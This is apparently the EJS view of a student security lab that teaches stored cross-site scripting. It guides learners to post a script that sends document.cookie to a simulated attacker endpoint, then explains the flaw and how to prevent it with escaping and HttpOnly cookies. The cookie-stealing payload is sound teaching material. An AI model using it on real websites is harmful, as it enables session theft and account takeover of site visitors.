<!-- 
    stored XSS view
    Jan Zboril 
    xzbori20@stud.fit.vutbr.cz
    FIT VUT Brno 2023
    WAP proj2
 -->

<!DOCTYPE html>
<html lang="en" class="html">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title><%- title.title %> | <%- title.subtitle.xss %></title>
        <link rel="stylesheet" href="/styles/xss.css">
        <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
        <script src="/api/fade.js"></script>
        <script src="/api/xss_stored_frame.js"></script>
        <script src="/api/copy_code.js"></script>
    </head>
    <body class="body">
        <div class="page-wrapper">
            <header class="title">
                <h1 class='title-text'><%= title.title %></h1>
                <img class='title-logo' src= <%-fitlogo%>   alt="FIT">
            </header>
            <p id='session-p' style='text-align:end' ></p>
            <nav>
                <ul class='topnav'>
                    <li><a href="/">Home</a></li>
                    <li><a class="active"  href="/xss">XSS</a></li>
                    <li><a href="/clickjacking">Clickjacking</a></li>
                    <li><a href="/csrf">CSRF</a></li>
                    <li style="float:right"><a href="/about">About</a></li>
                </ul>
            </nav>
            <main class="main">
                <div class="xss-wrapper">
                    <div class="xss-wrapper-left">
                        <h2>Stored XSS</h2>
                        <p>
                            Stored XSS is a type of XSS attack that occurs when an attacker is able to store malicious code on a web server. 
                            The malicious code is then retrieved and executed by any user's browser when they visit the page that contains the malicious code.
                            This is the most dangerous type of XSS attack, because every visitor to the page will be affected.
                        </p>
                        <p>
                            Attacker can use this vulnerability to steal cookies, session tokens, or other sensitive information retained by your browser and used with that site.
                            This information can be used to take over user accounts, change web site look, or redirect users to malicious sites.
                            Attacker can install the <a href="https://github.com/beefproject/beef">BeEf - The Browser Exploitation Framework</a> or other similar software to
                            further compromise the victim's browser - do various kind of phishing, etc.
                        </p>
                        <P>
                            In this lab, you will make permanent changes to the lab environment. If you want to reset the lab environment, click the button below:
                        </p>
                        <button id='reset-button' class="button reverse" type="button">Reset environment</button>
                        <section id='reset-button-sec'>
                            <p id="usr-created-note" class="note" style="display:none"></p>
                            <button class="good" id="reset-hide-button" style="display:none" onclick="resetNotesClose()"></button>
                        </section>
                        <div>
                            <ul>
                                <li class="fadeMe" id="li_1">
                                    <p>
                                        Examine the vulnerable page. It contains a form that allows you to post a comment.
                                        What can this form be used for?

                                    </p> 
                                    <button class="reverse" onclick="fade(0)"> Next </button>
                                </li>
                                <li class="fadeMe" id="li_2" hidden>
                                    <p>
                                        Enter the following code snippet as a comment to the vulnerable page.
                                        If the page is vulnerable, then this code will be embedded in the page and 
                                        executed everytime someone visits the page. After a while you will
                                        see the cookie value in the attacker page.
                                    </p>
                                    <p>
                                        The code will extract the cookies from the victim's browser and send them to the attacker's server.
                                        Attcker's server is simulated by the lower iframe.
                                    </p>
                                    <p>
                                        As this is only a educational simulation, the page will not contain the exploited comment, when
                                        opened in another browser. So you do not even have to try to send the link to your friends. You won't get
                                        their cookies!
                                    </p>
<code id="post-code" class="my-code">
&lt;script&gt;
fetch(
'<%- full_url %>/frame_attacker',
{
    method: 'POST',
    body: JSON.stringify(document.cookie)
});
&lt;/script&gt;
</code><br/>
                                    <button onclick="copyCode('post-code')">Copy code to clipboard</button>
                                    <br/>
                                    <button class="reverse" onclick="fade(1)"> Next </button>
                                </li>
                                <li class="fadeMe" hidden>
                                    <p>
                                        If everything went well, you should see the cookie value in the attacker page.
                                        What happened? The code you entered in the form was stored in the server's database in
                                        an unescaped form.
                                    </p>
                                    <p>
                                        When the page was loaded, the code was retrieved from the database and executed. The stolen
                                        cookie is actually yours - of this current session. If another user visits the page, their cookie
                                        will be send to the attacker's server.
                                    </p>
                                    <p>
                                        This page only simulates the attack, so you can't break the server. If you reset the lab,
                                        the comments are going to be cleared. The comments are actually not stored on server at all.
                                        Only the stolen cookies is stored in the server's memory and they can be retrieved to be shown
                                        in the attacker's page.
                                    </p>
                                    <button class="reverse" onclick="fade(2)"> Prevention </button>
                                </li>
                                <li class="fadeMe" id="li_3" hidden>
                                    <h3>Prevention</h3>
                                    <ul>
                                        <li>
                                            Properly validate all user input. Use correct escaping. Program
                                            your own solution to learn more, but in production, use a framework that automatically escapes all user input.
                                        </li>
                                        <li>
                                            On a server side - use the correct security parameters for cookies.
                                            Using the <code class="my-code">HttpOnly</code> flag will prevent the cookie from being accessed by JavaScript and this
                                            attack will not work. Also take a look at the other flags that can be used.

                                        </li>
                                        <li>
                                            Learn more here:
                                            <br/><a href="https://owasp.org/www-community/attacks/xss/">OWASP XSS</a>
                                            <br/><a href="https://owasp.org/www-community/HttpOnly">OWASP HttpOnly</a>
                                            <br/><a href="https://portswigger.net/web-security/cross-site-scripting/stored">Port Swigger Labs</a>
                                            <br/><a href="https://portswigger.net/web-security/cross-site-scripting/preventing">Port Swigger XSS Prevention</a>
                                            <br/>
                                        </li>
                                    </ul>
                                    <br/>
                                    <button class="reverse" onclick="fade(3)"> Return to start </button>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <div class="xss-stored-wrapper-right">
                        <p>
                            Vulnerable page: <code class="my-code"><%- full_url %>/frame</code>
                        </p>
                        <div class="example-frame-cls">
                            <iframe src="/xss_stored/frame" frameborder="0"></iframe>
                        </div>
                        <p>
                            Attacker page: <code class="my-code"><%- full_url %>/frame_attacker</code>
                            (refreshed every 5 seconds)
                        </p>
                        <div>
                            <iframe id="attacker-frame" src="/xss_stored/frame_attacker" frameborder="0"></iframe>
                        </div>
                    </div>
                </div>
            </main>
            <%- include('./_footer'); %>
        </div>
    </body>
</html>